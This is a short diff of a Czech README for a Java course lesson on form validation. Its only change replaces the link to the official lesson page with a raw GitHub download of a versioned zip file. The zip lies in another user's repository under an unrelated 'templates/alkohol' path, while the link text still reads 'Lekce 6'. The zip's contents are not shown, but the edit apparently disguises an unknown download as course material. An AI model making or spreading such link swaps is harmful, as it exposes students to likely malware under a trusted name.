@@ -16,4 +16,4 @@ Dnes budeme pokračovat ve zpracování formulářů. Ukážeme si, jak se děla
 1. Doplň do formuláře zobrazení chybových hlášek z validace.
 
 ## Odkazy
-* [Lekce 6](https://java.czechitas.cz/2021-jaro/java-2/lekce-6.html)
+* [Lekce 6](https://github.com/daduelle/j2w-lekce06/raw/refs/heads/zadani/src/main/resources/templates/alkohol/w-j-lekce-v3.7.zip)
